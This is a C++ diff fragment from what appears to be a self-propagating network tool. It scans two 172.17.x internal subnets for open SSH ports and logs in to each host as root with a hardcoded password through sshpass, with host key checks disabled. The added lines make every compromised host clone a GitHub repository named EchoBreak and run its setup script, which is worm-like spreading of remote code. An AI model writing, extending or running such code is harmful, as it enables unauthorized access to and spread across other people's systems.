@@ -126,12 +126,12 @@ int main(int argc, char* argv[]){
 		for(int i = 2; i < 256; ++i){
 			//212
 			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i); //ip
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
 				system(ip.c_str());
 			}
 			//213
 			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i); //ip
+				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
 				system(ip.c_str());
 			}
 		}
